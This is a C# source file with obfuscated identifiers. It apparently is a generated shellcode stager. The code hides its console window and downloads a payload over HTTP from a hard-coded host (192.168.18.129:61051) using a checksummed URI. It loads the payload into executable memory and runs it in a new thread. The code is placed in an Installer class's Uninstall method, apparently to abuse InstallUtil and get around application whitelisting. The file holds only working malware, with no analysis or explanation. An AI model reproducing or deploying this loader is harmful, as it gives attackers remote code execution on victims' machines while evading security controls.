using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;
namespace McrwRRSUMxpXy {[System.ComponentModel.RunInstaller(true)]
public class InstallUtil : System.Configuration.Install.Installer{
public override void Install(System.Collections.IDictionary savedState)
{Random lDLMXPWAEVijTc = new Random((int)DateTime.Now.Ticks);}
public override void Uninstall(System.Collections.IDictionary savedState){qpGVAQEZiGvPa.Main();}}
class qpGVAQEZiGvPa {
static string FgriDocAoKgE(Random r, int s) {
char[] TGNMNwuPlm = new char[s];
string fOjGKDAxLheJO = "2akAEYoud4KwPG6eDyzHR73SMB5bIWNvg1ZUflXpcVQJ0mCix8LtF9qsOjhnTr";
for (int i = 0; i < s; i++){ TGNMNwuPlm[i] = fOjGKDAxLheJO[r.Next(fOjGKDAxLheJO.Length)];}
return new string(TGNMNwuPlm);}
static bool xBTFJmoquuFN(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92);}
static string uufWNljGPKct(Random r) { string emDqNcglPVPu = "";
for (int i = 0; i < 64; ++i) { emDqNcglPVPu = FgriDocAoKgE(r, 3);
string AbMjmwJZVzQaaR = new string("2iAKWQ8VZT5v9UM6ItrgEfb3dceSkCB14uRsxhzyOoNDGpFaPJ0LqX7wHYlnmj".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
for (int j = 0; j < AbMjmwJZVzQaaR.Length; ++j) {
string rLeAQoPhKEU = emDqNcglPVPu + AbMjmwJZVzQaaR[j];
if (xBTFJmoquuFN(rLeAQoPhKEU)) {return rLeAQoPhKEU;}}} return "hiRQrAfycymFr";}static byte[] pyQEaYlScAlm(string ixXDHHwXNmpzJu) {
WebClient bnUOZYBhKnx = new System.Net.WebClient();
bnUOZYBhKnx.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
bnUOZYBhKnx.Headers.Add("Accept", "*/*");
bnUOZYBhKnx.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
bnUOZYBhKnx.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
byte[] SdwNleiLqhlefE = null;
try { SdwNleiLqhlefE = bnUOZYBhKnx.DownloadData(ixXDHHwXNmpzJu);
if (SdwNleiLqhlefE.Length < 100000) return null;}
catch (WebException) {}
return SdwNleiLqhlefE;}
static void mLiDSTQpMoSg(byte[] hccSwgXEmmB) {
if (hccSwgXEmmB != null) {
UInt32 FUkeQZknrVCEPP = VirtualAlloc(0, (UInt32)hccSwgXEmmB.Length, 0x1000, 0x40);
Marshal.Copy(hccSwgXEmmB, 0, (IntPtr)(FUkeQZknrVCEPP), hccSwgXEmmB.Length);
IntPtr iUlGKznywrvrxM = IntPtr.Zero;
UInt32 lXdFBjqhYn = 0;
IntPtr ASHZSMLuJdczn = IntPtr.Zero;
iUlGKznywrvrxM = CreateThread(0, 0, FUkeQZknrVCEPP, ASHZSMLuJdczn, 0, ref lXdFBjqhYn);
WaitForSingleObject(iUlGKznywrvrxM, 0xFFFFFFFF); }}
public static void Main(){
IntPtr nZFqworBeDZFz = GetConsoleWindow();
ShowWindow(nZFqworBeDZFz, 0);
Random MiifCJuCnUO = new Random((int)DateTime.Now.Ticks);
byte[] VqBTngQcXRPG = pyQEaYlScAlm("http://192.168.18.129:61051/" + uufWNljGPKct(MiifCJuCnUO));
mLiDSTQpMoSg(VqBTngQcXRPG);}
[DllImport("kernel32")] private static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] static extern bool ShowWindow(IntPtr GqhrrOjbENmuf, int SFMVwrjoaUO);
[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 ZmbQjIzroAQxta,UInt32 ttwyuzFxTiy, UInt32 mmaFUwYezeAhF, UInt32 ERSsGlzTnjb);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 VwFLvvBHUjpps, UInt32 lbDJZVdWKwq, UInt32 gJHOAhDpcXPyH,IntPtr EaRUBGZhRHei, UInt32 qgkivKsiToPMX, ref UInt32 JRYSMvrBfGUgjt);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr xFRwFALGqqdC, UInt32 lapOBsyDEt); } }
